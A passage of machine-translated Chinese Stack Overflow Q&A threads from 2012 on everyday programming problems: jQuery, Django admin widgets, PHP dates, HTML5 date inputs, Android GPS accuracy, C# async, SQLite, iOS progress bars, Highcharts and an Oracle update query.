//---------------------------------------------------------------//
void MyDialog::OnBnClickedMoveUp() {
    int nsel = m_MyListBox.GetSelCount();
    if(!nsel) { return; }
    std::vector<INT> selectedItems;
    selectedItems.resize(nsel);
    m_MyListBox.GetSelItems(nsel, &selectedItems[0]);
    CListBox_MoveSelectedItemsUp(m_MyListBox, selectedItems);
}

//---------------------------------------------------------------//
// Move selected items down in the listbox
//---------------------------------------------------------------//
void MyDialog::OnBnClickedMoveDown() {
    int nsel = m_MyListBox.GetSelCount();
    if(!nsel) { return; }
    std::vector<INT> selectedItems;
    selectedItems.resize(nsel);
    m_MyListBox.GetSelItems(nsel, &selectedItems[0]);
    CListBox_MoveSelectedItemsDown(m_MyListBox, selectedItems);
} 
```

# javascript - 当锚点 HREF 源不存在时隐藏图像

> ID：12068443
> 
> 赞同：1
> 
> 时间：2012-08-22T07:43:56.793
> 
> 标签：javascript, jquery, jquery-plugins

我想大约每 5 秒轮询一次锚点的 href 源，以查看该地址处的文件是否存在。当它存在时，在锚点中显示图像。换句话说，除非文件存在，否则链接基本上不存在。

我猜我必须使用 http HEAD 请求进行轮询以确定文件是否存在，然后适当地切换图像。一旦确定文件存在，我就可以停止轮询并保持图像可见。

有没有更好的方法来做到这一点，任何人都可以建议一些可以处理此功能的脚本吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:57:33.323

// 注意，这段代码假定使用的是 jQuery

```
var interval = setInterval(function(){
   var _el=$('#hrefId');
   var href = _el.attr('href');
   if(href == null || typeof href == 'undefined' || href == '')
      return;

   ajax call to href(in case on ur server(!) )

   // on success
   _el.attr('href','TheLink');
   $('img', _el).show(); // show image
}, 5); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:57:51.940

如果您的服务器配置为这样做，您可以使用：

[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

使用 statusCode 映射轮询文件是否存在

```
function checkFile() {
    $.ajax({
        statusCode: {
            404: function() {
                //file does not yet exist
                setTimeout(checkFile, 5000);
            }
            200: function() {
                //file exists.
                showImage();
            }
        }
    });
} 
```

不过，您可能希望捕获更多的边缘情况（例如，错误回调）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:02:08.883

您还可以使用套接字库，以便服务器可以在图像准备好时推送通知。socket.io 在这里似乎是一个不错的选择。

另一种方法是侦听`error`图像上的事件，然后等待 x 毫秒，然后再尝试再次加载它。这很容易实现，因为每次定义 src 属性时，浏览器都会添加新的侦听器。

它与您的元描述基本相同，但您不需要使用 ajax。您还可以从其他域加载图像（ajax 具有跨站点策略）：

```
var img = new Image(),
    src = '/path/to/image.jpg';
img.onload = function() {
    console.log('loaded', img);
};
img.onerror = function() {
    window.setTimeout(function() {
        img.src = src;
    },500);
};
img.src = src;​ 
```

**这是一个概念证明：http: [//jsfiddle.net/L2L3U/](http://jsfiddle.net/L2L3U/)**。该程序将尝试加载 404 图像三秒钟，然后我将 src 更改为真实图像并显示它。

# jquery - 在鼠标悬停和计时器上切换 jQuery 切换

> ID：12068447
> 
> 赞同：0
> 
> 时间：2012-08-22T07:44:02.870
> 
> 标签：jquery, toggle

在我的网站上，我有一个按钮。如果你点击它，会出现一个下拉菜单。如果你再次点击它。它会消失。我为此使用了 jQuery 函数 TOGGLE。现在我想要以下。如果您移出下拉菜单 2 秒钟，或单击下拉菜单外的某个位置。它必须再次消失。

有没有办法用计时器切换切换功能并点击外面？这是代码：

```
$(Ar3).addClass(aU);
$('.ContextMenuLink').toggle(function () {
    $(hP).css('background', '#fff');
    $('.ContextMenuTxt').css('color', '#6b8592');
    $(CM).css('display', 'block');
    $(Ar3).addClass(aD).removeClass(aU);
}, function () {
    $(hP).css('background', 'none');
    $('.ContextMenuTxt').css('color', '#fff');
    $(CM).css('display', 'none');
    $(Ar3).removeClass(aD).addClass(aU);
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:48:15.667

只需将您的计时器设置为发出`$('.ContextMenuLink').click()`.

至于外部点击，我会这样做：

```
$(document).click(function outSideClick(e){
    if(e.target != $('.ContextMenuLink')[0]){
        $('.ContextMenuLink').click();
        $(document).unbind('click',outSideClick);
    })
}); 
```

您还应该记住，每当您通过单击它或使用计时器关闭下拉列表时，取消绑定此事件。

# django - 如何在 django 管理页面中为 models.ImageField 自定义“清除”复选框？

> ID：12068450
> 
> 赞同：1
> 
> 时间：2012-08-22T07:44:12.627
> 
> 标签：django, django-admin, django-models, django-modeladmin

我在我的 django 应用程序中有一个用户配置文件的模型，它有一个 models.ImageField，当用户上传图像时，我有一个 ModelAdmin，在管理页面中，当我进入该用户的自定义页面时，在 ImageField 部分，有上传图片的url和一个名为“清除”的复选框和一个用于更新图片的按钮。如何更改该复选框的文本？例如我希望它有文本“删除”而不是“清除”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:52:23.530

似乎“清除”是硬编码。

因此，您可以像这样创建一个自定义小部件：

```
class MyClearableFileInput(ClearableFileInput):
    clear_checkbox_label = ugettext_lazy('Delete') 
```

并像这样将其分配给您的表单字段

```
MyForm(forms.Form):
    myfile=ImageField(widget=MyClearableFileInput) 
```

或在您的管理员中添加覆盖它

```
class MyModelAdmin(admin.ModelAdmin):
    formfield_overrides = {
        models.ImageField: {'widget': MyClearableFileInput},
    } 
```

或者您使用转换机制将清除转换为删除。[文档](https://docs.djangoproject.com/en/dev/topics/i18n/)中很好地描述了 Django 翻译。

我个人认为这对您的问题来说是相当多的开销，除非您无论如何都在使用翻译。我会明确推荐自定义小部件 - 附加代码非常少。

# php - 多层 div 显示和隐藏问题

> ID：12068457
> 
> 赞同：0
> 
> 时间：2012-08-22T07:44:48.350
> 
> 标签：php, jquery

感谢您在这里关注我的问题。我是 PHP 和 jQuery 编程的初学者。现在我正在尝试创建一个非常简单的函数来显示和隐藏多层 div。例如，当您点击“显示 div 1”时，会显示 div 1 下的相应内容（这是 div 1 的内容）。之后，您仍然可以单击 div 1 下的内容以显示较低级别的内容（graph1）。我让所有这些工作正常。但是，当我单击“显示 div 2”时，将显示 div 2 的内容（这是 div 2 的内容），但 div 1 的较低级别的内容仍然存在（graph1）。我想要的是显示div 1的下部内容，然后单击show div 2，div 1的下部内容将被隐藏，只显示div 2的内容。以下是我的代码，先谢谢大家了~

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>show and hide try</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<script>
function showStock(n)
{
document.getElementById("div"+n).style.display = 'block'
return false;
}

function hideStock(n)
{
for (x=1; x<=10; x++)
{
document.getElementById("div"+x).style.display = 'none'
}
document.getElementById(n).style.display = 'block'
return false;
}

function toggleStock(id)
{
    for (x=1; x<=3; x++)
    {
        document.getElementById("div"+x).style.display = 'none';
    }

    document.getElementById(id).style.display = 'block';
}

</script>

<script>
function showGraph(m)
{
document.getElementById("graph"+m).style.display = 'block'
return false;
}

function hideGraph(m)
{
for (y=1; y<=10; y++)
{
document.getElementById("graph"+y).style.display = 'none'
}
document.getElementById(m).style.display = 'block'
return false;
}

function toggleGraph(id)
{
    for (y=1; y<=3; y++)
    {
        document.getElementById("graph"+y).style.display = 'none';
    }

    document.getElementById(id).style.display = 'block';
}

</script>

</head>

<body>

<table width="50%" border="1" cellspacing="0" cellpadding="0">
<tr>
<td>
<a href="#" onClick="toggleStock('div1');return false;">show div 1</a> &nbsp;
<a href="#" onClick="toggleStock('div2');return false;">show div 2</a> &nbsp;
<a href="#" onClick="toggleStock('div3');return false;">show div 3</a>
</td>
</tr>
</table>

<div id="div1" style="display: none; border:1px solid black;">
<table border=1 width=25% cellspacing="0" cellpadding="0">
<tr><td><a href="#" onClick="toggleGraph('graph1');return false;">this is div 1 contents</a></td></tr>
</table>
</div>

<div id="div2" style="display: none; border:1px solid black;">
<table border=1 width=25% cellspacing="0" cellpadding="0">
<tr><td><a href="#" onClick="toggleGraph('graph2');return false;">this is div 2 contents</a></td></tr>
</table>
</div>

<div id="div3" style="display: none; border:1px solid black;">
<table border=1 width=25% cellspacing="0" cellpadding="0">
<tr><td><a href="#" onClick="toggleGraph('graph3');return false;">this is div 3 contents</a></td></tr>
</table>
</div>

<div id="graph1" style="display: none; border:1px solid black;">graph1</div>
<div id="graph2" style="display: none; border:1px solid black;">graph2</div>
<div id="graph3" style="display: none; border:1px solid black;">graph3</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:50:55.117

用这个替换你的代码，希望它会帮助你

```
function toggleStock(id)
{
    for (x=1; x<=3; x++)
    {
        document.getElementById("div"+x).style.display = 'none';
    }

    document.getElementById(id).style.display = 'block';
  toggleGraph(id);
} 
```

# android - 第一次修复的时间

> ID：12068459
> 
> 赞同：-1
> 
> 时间：2012-08-22T07:44:58.087
> 
> 标签：android, gps

只要我不关闭并重新启动gps引擎，首次修复的时间是否相同？不管我什么时候检查？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:13:18.390

忘记不同的设备和硬件。如果您依赖于及时修复，那么您的应用程序将只能使用相同设备的相同型号，并且可能使用相同的内核模块。

现在考虑这种情况。

我开始修复。我在外面的街道上，可以清楚地看到天空。我在 xxx 秒内得到修复。现在我搬进了我的房子。我什么都没改变，只是我的位置。然后我开始另一个修复。需要 xxx 秒吗？

我怀疑你问错了问题。为什么修复的时间对你很重要？

我不知道您所问问题的直接答案，我怀疑是否有经验答案。我能给你的最好的直接答案是“不确定”。

# layout - 高级 CSS 圆圈

> ID：12068463
> 
> 赞同：2
> 
> 时间：2012-08-22T07:45:15.700
> 
> 标签：layout, css

我正在尝试为我的网站制作 3 个不同的圈子。我不想将它作为图形/图像文件插入。所以我一直在尝试使用 CSS3 来实现它，但我无法真正解决它。

**它会是什么样子？** 我已经上传了一张我想要实现的图片：[www.sp34k.com/etc/circles.jpg](http://www.sp34k.com/etc/circles.jpg) 我无法真正展示我一直试图用来实现这一目标的代码，因为它看起来完全很奇怪，没有任何东西可以正确浮动。

**我试过** 的我试过的是用绝对位置制作 3 个圆圈，然后使用 % （百分比）来确定彩色部分的宽度，但我无法改变应该如何设置的想法。

任何建议表示赞赏，迈克

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T09:19:00.413

这是我的一个简单尝试，以达到您想要的效果：

**[演示](http://jsfiddle.net/poikl/snGq6/3/)**

编辑：[纯 CSS 解决方案](http://jsfiddle.net/poikl/snGq6/5/)

它可以很容易地使用 javascript 或关键帧进行动画处理。任意内容将进入`inner`div。要更改百分比，只需调整伪元素的角度即可。

我猜这可以很容易地改进；）

注意：转换具有 webkit-prefix，因此它仅适用于 chrome/safari - 要在 firefox 或其他浏览器中看到它，您需要更改前缀。

PS当我下班回家时，我会为它制作动画。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-22T10:50:15.733

**Christoph**写的不错， 但他使用的是 SASS/SCSS，它们比普通 CSS 慢，因为它们必须在浏览器渲染之前转换为 CSS，所以我有一个不同的解决方案给你

试试这个[小提琴](http://jsfiddle.net/gajjuthechamp/hAHju/)

# php - 计算接下来 X 周的开始/结束日期

> ID：12068465
> 
> 赞同：1
> 
> 时间：2012-08-22T07:45:23.273
> 
> 标签：php, date, time

我正在尝试在 PHP 中构建一个函数，这取决于日期会给我

本周（周一至周日）20/8/12 至 26/8/12

下周+1（周一至周日）27/8/12 至 02/9/12

下周+2（周一至周日）03/9/12 至 09/9/12

下周+3（周一至周日）

下周+4（周一至周日）

下周+5（周一至周日）

我尝试过使用以下内容，但是有什么更清洁的吗？

```
$week0_mon = date("Y-m-d", strtotime(date("Y").'W'.date('W')."1"));
$week0_sun = date("Y-m-d", strtotime(date("Y").'W'.date('W')."7"));

$week1_mon = date("Y-m-d", strtotime(date("Y-m-d", strtotime($week0_mon)) . " +1 week"));
$week1_sun = date("Y-m-d", strtotime(date("Y-m-d", strtotime($week0_sun)) . " +1 week"));

echo $week0_mon.' to '.$week0_sun.'<br />';
echo $week1_mon.' to '.$week1_sun.'<br />'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:20:38.970

也许这会回答你的问题，它计算上一个星期一并从这里开始一次添加一个星期。只需编辑`for`

```
$dOffsets = array("Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday");
$prevMonday = mktime(0,0,0, date("m"), date("d")-array_search(date("l"),$dOffsets), date("Y"));
$oneWeek = 3600*24*7;$toSunday = 3600*24*6;

for ($i=0;$i<= 5;$i++)
{
    echo "Week +",$i," (mon-sun) ",
            date("d/m/Y",$prevMonday + $oneWeek*$i)," to ",
            date("d/m/Y",$prevMonday + $oneWeek*$i + $toSunday),"<br>";
} 
```

这给了我

```
Week +0 (mon-sun) 20/08/2012 to 26/08/2012
Week +1 (mon-sun) 27/08/2012 to 02/09/2012
Week +2 (mon-sun) 03/09/2012 to 09/09/2012
Week +3 (mon-sun) 10/09/2012 to 16/09/2012
Week +4 (mon-sun) 17/09/2012 to 23/09/2012
Week +5 (mon-sun) 24/09/2012 to 30/09/2012 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:24:32.730

I've adjusted @Wr1t3r answer to give correct date ranges as follows:

```
function plus_week($addWeek=0){
    $last_monday_timestamp=strtotime('-'.(date('N')-1).' days');
    if($addWeek!=0){
        if($addWeek>0) $addWeek='+'.$addWeek;
        $last_monday_timestamp=strtotime($addWeek.' week', $last_monday_timestamp);
    }
    $end_week_timestamp = strtotime ('+6 days', $last_monday_timestamp);
    return date('d/m/y', $last_monday_timestamp).' to '.date('d/m/y', $end_week_timestamp);
} 
```

date('N') will give weekday number mon-sun (1-7) so if we subtract 1 from this we know how many days to go back to last monday. OR we could have used strtotime('last monday'). BUT this way ensures we dont go back to last monday if we are currently on monday.

Monday=1 so (1-1=0) -0 days = today
Friday=5 so (5-1=4) -4 days = monday
SUNDAY=7 (not 0 if we used 'w') so (7-1=6) -6 days = monday (not tomorrow)

I've also adjusted this to do negative week numbers too.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-22T08:02:51.993

我是这样做的。我不确定它是否正是你想要的。

```
function plus_week($addWeek){
    $date = date("d.m.Y",time());
    $newdate = strtotime ( '+'.$addWeek.' week' , strtotime ( $date ) ) ;
    $newdate = date ( 'd/m/y' , $newdate );
    return $newdate;
}

for($i = 1; $i < 7; $i++){
    echo "Following week+".$i." ".plus_week($i)." to ".plus_week($i+1)."<br/>";
} 
```

从这里你会得到这样的答案：

下周+1 29/08/12 至 05/09/12

下周+2 05/09/12 至 12/09/12

下周+3 12/09/12 至 19/09/12

下周+4 19/09/12 至 26/09/12

下周+5 26/09/12 至 03/10/12

下周+6 03/10/12 至 10/10/12

# android - Android 位置 API 是否完整？

> ID：12068468
> 
> 赞同：2
> 
> 时间：2012-08-22T07:45:34.863
> 
> 标签：android, gps

我曾经遇到过一个奇怪的情况：手机地图应用程序甚至我的应用程序上的位置都错了一个非常大的增量。因为它与实际位置完全不同。是很多人遇到过的问题还是我的设备出现了一些错误？这种情况发生的大概概率是多少（来自那些测试过这个错误的人）？

我正在使用带有 ICS 的三星 Galaxy SII，我的应用程序从 GPS_PROVIDER 获取信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:51:47.943

我的位置在设备打开后几秒钟内大量关闭是很正常的，直到无线电可以修复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:55:35.523

如果地图应用程序无法修复您当前的位置，您可能会遇到缓存位置。要在您的应用中获取最新位置，请在[此处查看此问题](https://stackoverflow.com/questions/7898930/how-to-get-location-that-isnt-out-of-date)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T14:51:30.030

我见过超过 10000 公里的错误。我正在查看`network`仅来自单元格和 wifi 的修复，没有 gps。即使我在加利福尼亚（美国）的奥特莱斯购物中心，修复也让我在英格兰（英国）的某个地方。我的猜测是有人将他们的 wifi 服务器从英国搬到了加利福尼亚，而 Google WiFi 数据库还没有自行更新。我还有一些类似的错误，但没有那么壮观，在美国其他州只有 1000-5000 公里的报告位置。

基于蜂窝塔的网络修复通常会在 1 公里之外，并且通常在 10 公里之外。这些是基于手机看到的手机信号塔，在丘陵地形中，您经常会错过最近的手机信号塔并抓住几公里外高处的手机信号塔。

GPS 修复也可能有错误，但通常小于 1 公里。这些错误主要发生在某些 GPS 信号被山丘或建筑物阻挡或被附近的山丘或建筑物反射时。

我在测试Android手机定位时已经看到了以上所有内容。并非所有手机的行为都相同，GPS 实施的质量（芯片选择、射频设计）会在性能上产生很大差异。

# jquery - 使用按钮输入和 jQuery 提交表单

> ID：12068471
> 
> 赞同：1
> 
> 时间：2012-08-22T07:45:46.870
> 
> 标签：jquery, forms, button, submit

我有这样的表格：

```
<form id="myform" action="something.php" method="post">
<input type="text" name="first_name" /><br />
<input type="button" id="submit" value="Send" />
</form> 
```

我想在从 JavaScript 和 jQuery 中的某些进程获得成功消息后提交此表单。所以我这样做了：

```
$(document).ready(function(e) {
  $('#submit').click(function(event){
    event.preventDefault();

    $.post('process/process.php',
          {
              // I passed data here
          },
          function(data) {
              if (data.result == '1') {
                  $('#myform').submit();
              } else {
                  alert('Error #'+data.result+' occurred!');
              }
          },
          'json'
    );
  });
}); 
```

但是即使得到了`data.result == '1'`，提交表单也不起作用。这里有什么问题？

* * *

**编辑：**

我已将 jQuery 更改为：

```
$(document).ready(function(e) {
  $('#submit').click(function(event){
    $('#myform').submit();
  )};
)}; 
```

所以现在没有条件，但是表单没有提交。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T08:55:07.710

从 jQuery[文档中`.submit()`](http://api.jquery.com/submit/)，

> 补充笔记：
> 
> 表单及其子元素**不应使用与表单属性（例如提交、**长度或方法）冲突的输入名称或 ID。名称冲突可能会导致令人困惑的失败。有关规则的完整列表并检查这些问题的标记，请参阅 DOMLint。

将第二个输入的 id 重命名为`submitForm`或类似的名称。

工作小提琴：http: [//jsfiddle.net/WvSdX/](http://jsfiddle.net/WvSdX/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:51:48.070

我认为这是一个价值比较问题。为了给我们一个更好的方法来确定是否是这种情况，您可以暂时将回调更改为 this 并尝试一下吗？

```
$(document).ready(function(e) {
    $('#submit').click(function(event){
      event.preventDefault();

      $.post('process/process.php',
          {
              // I passed data here
          },
          function(data) {
               $('#myform').submit();   
          },
          'json'
    );
  });
}); 
```

如果表单被提交，那么 jQuery 部分没有任何问题，这是从 post() 操作中正确获取结果的问题。

请试一试，让我知道它是否有效。

# c# - 奇怪的 try..catch 异步行为

> ID：12068472
> 
> 赞同：3
> 
> 时间：2012-08-22T07:45:48.850
> 
> 标签：c#, asynchronous, exception-handling

我开始使用 .NET 4.5，尤其是 async/await 功能。

我来到下面的代码，令我惊讶的是，它编译了。谁能解释我的原因？

```
async Task SomeMethod()
{
    try
    {
        await Task.Delay(1000);
    }
    catch
    {

    }
} 
```

对于以前的 .NET 版本，编译器会抱怨类似以下的消息：“并非所有路径都返回值”。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T07:47:43.703

返回的异步方法`Task`等效于返回的普通方法`void`。这里没有特定于 try/catch 的内容 - 不要忘记您的`try`块也不会返回任何内容！

因此，您的代码的非异步版本将是：

```
void SomeMethod()
{
    try
    {
        Thread.Sleep(1000)
    }
    catch
    {
    }
} 
```

...显然这会编译。（同样显然，使用 bare 很糟糕`catch`，但我认为这不是真正的问题:)

*此*代码不会编译：

```
async Task<int> SomeMethod()
{
    try
    {
        await Task.Delay(1000);
        return 10;
    }
    catch
    {

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:11:04.127

为了回答您对 Jon 的回答的问题，我将这些链接添加为单独的答案以提高可读性。

为了获得有关幕后发生的事情的更多信息，我想向您指出 MSDN 杂志中的这些文章，这些文章帮助我开始使用它：

MSDN 2011 年 10 月号：[使用 .NET 进行并行编程](http://blogs.msdn.com/b/pfxteam/archive/2011/10/03/10219193.aspx)

1.  [暂停和播放等待](http://msdn.microsoft.com/en-us/magazine/hh456403.aspx)
2.  [异步性能：了解异步和等待的成本](http://msdn.microsoft.com/en-us/magazine/hh456402.aspx)
3.  [使用新的 Visual Studio Async CTP 更轻松地进行异步编程](http://msdn.microsoft.com/en-us/magazine/hh456401.aspx)

特别是前两篇文章可能是您正在寻找的，因为它们更好地描述了编译器如何在内部重写您的代码以使其`async/ await`工作。

# php - 输入类型 date html5 并从数据库接收数据

> ID：12068476
> 
> 赞同：6
> 
> 时间：2012-08-22T07:46:01.910
> 
> 标签：php, html, date, input

我在`Chrome`本地工作`WAMP`，`PHP`版本 5。我使用输入类型 date，它显示一个日历。事实上，我在用户的数据编辑页面中得到了一些变量。我担心的是所有数据都被收集了。但是对于日期，他没有显示数据库中的记录（由 确认`var_dump`），而是显示一个占位符`Day / Month / Year`

我不感兴趣，当且仅当我的字段为空时，我才想要这个占位符。

以下是该字段的语法：

```
<input name="datedepart" type="date"  value="<?php echo date('d/m/Y',strtotime($data["congestart"])) ?>"/> 
```

有办法吗？

接受亲爱的所有我最崇高的敬意。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-22T07:54:05.087

是的，将日期格式更改为 ISO 可能就足够了，例如 2012-08-22：

```
<input name="datedepart" type="date"
value="<?php echo date('Y-m-d',strtotime($data["congestart"])) ?>"/> 
```

如果您的服务器需要其他格式，则必须使用 Javascript 对其进行转换（ISO 是 HTML5 规范中使用的标准，因此输入字段的值将始终为 ISO，无论 Chrome 如何显示它）。

**更新，澄清：**

日期字段只能包含有效日期。当您尝试将其设置为一些随机垃圾时，该值将变为空。当值为空时 - Chrome 显示占位符。HTML5 中唯一有效的日期格式是 ISO：2012-03-04。试试看：

```
<input value='2004-02-12' type='date'> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:54:36.897

利用

```
placeholder="<?php echo date('d/m/Y',strtotime($data["congestart"])) ?>" 
```

而不是赋予它价值。

如果这不能解决答案，那么再解释一下你想要做什么？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-26T05:50:24.143

我知道它的旧线程，但我认为这对某人有帮助

尝试使用 min 和 max 然后这将选择您提供的值。

喜欢

```
<input type="date" min="2014-09-08" max="2018-09-08" value="2015-02-24" > 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-02T22:22:30.327

**这从fdreger**非常有效：

```
<input name="datedepart" type="date" value="<?php echo date('Y-m-   d',strtotime($data["congestart"])) ?>"/> 
```

我需要同样的东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-11-02T16:53:32.870

对我有用的是删除从php返回的值周围的引号，因此对于您的代码，它将尝试以下操作：

```
<input name="datedepart" type="date"  value=<?php echo date('d/m/Y',strtotime($data["congestart"])) ?>/> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-09-07T07:46:34.783

```
<form class="forms-sample" method="post" action="<?php echo base_url(); ?>Program/program_general">
    <td style="text-align: center;">
        <input class="btn btn-sm btn-outline-primary" type="submit" value="View">
        <input type="hidden" value="<?php echo $row['ProgramID']; ?>" name="program_id">
        <input type="hidden" value="<?php echo $row['ProgramName']; ?>" name="program_name">
        <input type="hidden" value="<?php echo $row['ProgramDescription']; ?>" name="program_description">
        <input type="hidden" value="<?php echo date("d-m-Y", strtotime($row['ProgramStartDate'])); ?>" name="program_startdate">
        <input type="hidden" value="<?php echo date("d-m-Y", strtotime($row['ProgramEndDate'])); ?>" name="program_enddate">
    </td>
</form>

<input name="program_name" type="text" class="form-control" id="exampleInputUsername1" value="<?php if (!empty($this
    ->input
    ->post('program_name')))
{
    echo $this
        ->input
        ->post('program_name');
} ?>" placeholder="Program Name"> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-05-22T20:59:57.127

这个对我有用

```
 <input name="datedepart" type="date" value=<?php echo strftime('%Y-%m-%d', strtotime($data['congestart'])); ?>"/> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-06-30T16:09:39.280

Its work for me

```
<input class="form-control calendar" name="datedepart" required="" type="date" id="datedepart" aria-required="true" value="<?php echo date('Y-m-d',strtotime($data["congestart"])) ?>"> 
```

# cordova - DBConnect错误处理sql：在SQLite中插入日期和时间时未定义

> ID：12068478
> 
> 赞同：0
> 
> 时间：2012-08-22T07:46:06.197
> 
> 标签：cordova, sqlite

如何使用 Phonegap 在 SQLite 数据库中存储日期和时间？我尝试将数据类型用作“NUMERIC”并使用 DATETIME('now') 插入查询。但我收到一个错误：“DBConnect 错误处理 sql:undefined”。

使用 Phonegap 在 SQLite 数据库中存储日期和时间的最佳方法是什么？我还需要按此表中的日期和时间排序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T13:19:08.027

日期时间列应创建为`varchar(40)` （而不是像 Access 中那样的数字）

内部表示是 2012-08-31 hh:mm:ss。

所以`Select * from x ORDER BY dt DESC`将是最新的

# objective-c - XCode for iOS 中的动画进度条

> ID：12068481
> 
> 赞同：1
> 
> 时间：2012-08-22T07:46:10.143
> 
> 标签：objective-c, ios, xcode

> **可能重复：**
> [如何将 UIProgressView 初始化为某个值？](https://stackoverflow.com/questions/1938487/how-to-initiate-uiprogressview-to-a-certain-value)

我想在 XCode 中创建一个简单的进度条动画。所以，当我打开页面时，它应该动画到特定的百分比。我对 XCode 不太熟悉，这就是我在这里问的原因。我试图用谷歌搜索，但没有具体的解决方案。对此有什么建议吗？我也在这里查看了一些建议，但没有运气。

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-22T07:51:05.447

UIProgressView 有一个方法来设置它的动画进度。只需在创建视图时调用它：

```
UIProgressView *view = [[UIProgressView alloc] initWithProgressViewStyle:someStyle];
[view setProgress:0.7 animated:YES]; 
```

# highcharts - 工具提示和格式化程序的 highcharts 问题，yaxis 上的 min:0

> ID：12068483
> 
> 赞同：0
> 
> 时间：2012-08-22T07:46:16.153
> 
> 标签：highcharts

如果 shared 为 false，则不显示工具提示！！！如果我将 min 更改为 null 它会显示工具提示！

在之前的highcharts中，这个问题不存在

```
$(function () {
      var chart = new Highcharts.Chart({
        chart: {
            renderTo: 'container'

        },
        xAxis: {
            type: 'datetime'
        },

        yAxis: {
            min: 0,
            startOnTick: false
        },
        tooltip: {
                crosshairs: [true,true],
                formatter: function() {
                    return 'The value for <b>'+ this.x +
                        '</b> is <b>'+ this.y +'</b>';
                }
            },

        series: [{
            data:[[1345593599999,null],[1345593600000,0.0010000000474975],[1345594200000,0.0010000000474975],[1345594800000,0.0010000000474975],[1345595400000,0.0010000000474975],[1345596000000,0.0010000000474975],[1345596600000,0.0010000000474975],[1345597200000,0.0010000000474975],[1345597800000,0.0010000000474975],[1345598400000,0.0010000000474975],[1345599000000,0.0010000000474975],[1345599600000,0.0010000000474975],[1345600200000,0.0010000000474975],[1345600800000,0.0010000000474975],[1345601400000,0.0010000000474975],[1345602000000,0.0010000000474975],[1345602600000,0.0010000000474975],[1345603200000,0.0010000000474975],[1345603800000,0.0010000000474975],[1345604400000,0.0010000000474975],[1345605000000,0.0010000000474975],[1345605600000,0.0010000000474975],[1345606200000,0.0010000000474975],[1345606800000,0.0010000000474975],[1345607400000,0.0010000000474975],[1345608000000,0.0010000000474975],[1345608600000,0.0010000000474975],[1345609200000,0.0010000000474975],[1345609800000,0.0010000000474975],[1345610400000,0.0010000000474975],[1345611000000,0.0010000000474975],[1345611600000,0.0010000000474975],[1345612200000,0.0010000000474975],[1345612800000,0.0010000000474975],[1345613400000,0.0010000000474975],[1345614000000,0.0010000000474975],[1345614600000,0.0010000000474975],[1345615200000,0.0010000000474975],[1345615800000,0.0010000000474975],[1345616400000,0.0010000000474975],[1345617000000,0.0010000000474975],[1345617600000,0.0010000000474975],[1345618200000,0.0010000000474975],[1345618800000,-2147483.75],[1345619400000,-1073741.625],[1345620000000,0.39273166656494],[1345620600000,0.56872498989105],[1345621200000,0.82007998228073],[1345621800000,1.2374949455261],[1345622400000,1.8156150579453],[1345623000000,2.515278339386],[1345623600000,3.2450299263],[1345624200000,4.0675683021545],[1345624800000,5.0065865516663],[1345625400000,5.9605016708374],[1345626000000,6.8903851509094],[1345626600000,7.8542332649231],[1345627200000,8.8226404190063],[1345627800000,9.7728967666626],[1345628400000,10.693440437317],[1345628400001,null],[1345679999001,null]]
        }]
    });
});​ 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:32:44.663

您的两个值是负值，因此将 min 设置为 0 会使它们不可见，这似乎破坏了工具提示，如果我删除它工作的两个负值。为什么你有负值？尤其是当你将 min 设置为 0 时？

[http://jsfiddle.net/hBbdj/2/](http://jsfiddle.net/hBbdj/2/)

# oracle - ORACLE 更新相关查询

> ID：12068488
> 
> 赞同：1
> 
> 时间：2012-08-22T07:46:22.857
> 
> 标签：oracle

我有一个使用相关方法的更新查询，如下所示。这需要很长时间才能运行。有没有更好的方法来重写这个。提前感谢您的帮助。

```
UPDATE DAC A
   SET (acc_obj_header,
        acc_sub_header,
        acc_desc_header
   ) = (SELECT B.acc_obj,
               B.acc_sub,
               B.acc_desc
          FROM DAC B
         WHERE B.country_code = A.country_code
           AND B.comp_no = A.comp_no
           AND B.bu_no = A.bu_no
           AND B.acc_level_of_detail < A.acc_level_of_detail
           AND (B.acc_obj || B.acc_sub) = (SELECT MAX(C.acc_obj || C.acc_sub)
                                             FROM DAC C
                                            WHERE C.country_code = A.country_code
                                              AND C.comp_no = A.comp_no
                                              AND C.bu_no         =A.bu_no
